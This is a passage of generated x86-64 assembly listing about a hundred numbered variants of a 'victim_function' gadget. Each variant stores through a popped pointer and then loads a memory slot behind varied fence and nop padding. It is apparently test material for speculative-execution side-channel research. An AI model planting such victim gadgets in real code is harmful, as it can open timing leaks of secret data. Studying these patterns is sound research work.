.Lvictim_function_win0_var1123:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1124
.Lvictim_function_win0_var1124:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1125
.Lvictim_function_win0_var1125:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1126
.Lvictim_function_win0_var1126:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1127
.Lvictim_function_win0_var1127:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1128
.Lvictim_function_win0_var1128:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1129
.Lvictim_function_win0_var1129:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1130
.Lvictim_function_win0_var1130:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1131
.Lvictim_function_win0_var1131:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1132
.Lvictim_function_win0_var1132:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1133
.Lvictim_function_win0_var1133:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	nop
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1134
.Lvictim_function_win0_var1134:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1135
.Lvictim_function_win0_var1135:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1136
.Lvictim_function_win0_var1136:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1137
.Lvictim_function_win0_var1137:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1138
.Lvictim_function_win0_var1138:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1139
.Lvictim_function_win0_var1139:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1140
.Lvictim_function_win0_var1140:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1141
.Lvictim_function_win0_var1141:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1142
.Lvictim_function_win0_var1142:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1143
.Lvictim_function_win0_var1143:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1144
.Lvictim_function_win0_var1144:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1145
.Lvictim_function_win0_var1145:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1146
.Lvictim_function_win0_var1146:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1147
.Lvictim_function_win0_var1147:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1148
.Lvictim_function_win0_var1148:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1149
.Lvictim_function_win0_var1149:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1150
.Lvictim_function_win0_var1150:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1151
.Lvictim_function_win0_var1151:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	pushfq
	andq	$0, %r10
	nop
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1152
.Lvictim_function_win0_var1152:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1153
.Lvictim_function_win0_var1153:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1154
.Lvictim_function_win0_var1154:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1155
.Lvictim_function_win0_var1155:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1156
.Lvictim_function_win0_var1156:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1157
.Lvictim_function_win0_var1157:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1158
.Lvictim_function_win0_var1158:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1159
.Lvictim_function_win0_var1159:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1160
.Lvictim_function_win0_var1160:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1161
.Lvictim_function_win0_var1161:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1162
.Lvictim_function_win0_var1162:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1163
.Lvictim_function_win0_var1163:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1164
.Lvictim_function_win0_var1164:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1165
.Lvictim_function_win0_var1165:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1166
.Lvictim_function_win0_var1166:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1167
.Lvictim_function_win0_var1167:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1168
.Lvictim_function_win0_var1168:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1169
.Lvictim_function_win0_var1169:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1170
.Lvictim_function_win0_var1170:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1171
.Lvictim_function_win0_var1171:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1172
.Lvictim_function_win0_var1172:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1173
.Lvictim_function_win0_var1173:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	nop
	mfence
	nop
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1174
.Lvictim_function_win0_var1174:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1175
.Lvictim_function_win0_var1175:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1176
.Lvictim_function_win0_var1176:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1177
.Lvictim_function_win0_var1177:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1178
.Lvictim_function_win0_var1178:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1179
.Lvictim_function_win0_var1179:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1180
.Lvictim_function_win0_var1180:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1181
.Lvictim_function_win0_var1181:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1182
.Lvictim_function_win0_var1182:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1183
.Lvictim_function_win0_var1183:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1184
.Lvictim_function_win0_var1184:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1185
.Lvictim_function_win0_var1185:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1186
.Lvictim_function_win0_var1186:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	nop
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1187
.Lvictim_function_win0_var1187:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1188
.Lvictim_function_win0_var1188:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1189
.Lvictim_function_win0_var1189:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1190
.Lvictim_function_win0_var1190:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1191
.Lvictim_function_win0_var1191:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1192
.Lvictim_function_win0_var1192:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1193
.Lvictim_function_win0_var1193:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1194
.Lvictim_function_win0_var1194:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1195
.Lvictim_function_win0_var1195:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1196
.Lvictim_function_win0_var1196:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1197
.Lvictim_function_win0_var1197:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1198
.Lvictim_function_win0_var1198:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1199
.Lvictim_function_win0_var1199:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1200
.Lvictim_function_win0_var1200:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1201
.Lvictim_function_win0_var1201:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1202
.Lvictim_function_win0_var1202:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1203
.Lvictim_function_win0_var1203:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1204
.Lvictim_function_win0_var1204:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1205
.Lvictim_function_win0_var1205:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1206
.Lvictim_function_win0_var1206:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1207
.Lvictim_function_win0_var1207:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1208
.Lvictim_function_win0_var1208:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1209
.Lvictim_function_win0_var1209:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1210
.Lvictim_function_win0_var1210:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1211
.Lvictim_function_win0_var1211:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1212
.Lvictim_function_win0_var1212:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1213
.Lvictim_function_win0_var1213:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1214
.Lvictim_function_win0_var1214:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1215
.Lvictim_function_win0_var1215:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1216
.Lvictim_function_win0_var1216:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1217
.Lvictim_function_win0_var1217:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1218
.Lvictim_function_win0_var1218:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1219
.Lvictim_function_win0_var1219:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1220
.Lvictim_function_win0_var1220:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
